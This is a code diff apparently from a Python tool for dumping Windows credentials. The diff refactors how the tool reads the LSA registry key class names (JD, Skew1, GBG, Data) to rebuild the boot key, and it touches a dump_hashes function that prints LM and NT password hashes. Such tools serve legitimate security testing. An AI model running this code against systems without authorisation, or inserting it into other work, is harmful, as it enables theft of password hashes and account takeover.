@@ -105,18 +105,12 @@ def find_control_set():
 def get_bootkey():
     global p
     cs = find_control_set()
-    lsa_keys = {
-        "JD": "Lookup",
-        "Skew1": "SkewMatrix",
-        "GBG": "GrafBlumGroup",
-        "Data": "Pattern"
-    }
+    lsa_keys = ['JD', 'Skew1', 'GBG', 'Data']
     bootkey = b""
 
     for lk in lsa_keys:
         class_data = get_hklm_class(
-            "SYSTEM\\ControlSet%03d\\Control\\Lsa\\%s" % (cs, lk),
-            lsa_keys[lk])
+            "SYSTEM\\ControlSet%03d\\Control\\Lsa\\%s" % (cs, lk))
         bootkey += bytes.fromhex(class_data.decode())
     bootkey_unscrambled = bytearray()
     for i in range(len(bootkey)):
@@ -223,15 +217,7 @@ def dump_hashes():
             user, 16), hexlify(lmhash).upper(), hexlify(nthash).upper())
 
 
-def get_hklm_class_(rk, value_name):
-    hkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
-                          rk,
-                          access=winreg.KEY_READ)
-    val, _ = winreg.QueryValueEx(hkey, value_name)
-    return val
-
-
-def get_hklm_class(rk, pass_var):
+def get_hklm_class(rk):
     a = ctypes.windll.Advapi32
     HKEY_LOCAL_MACHINE = -2147483646
     KEY_READ = 0x20019
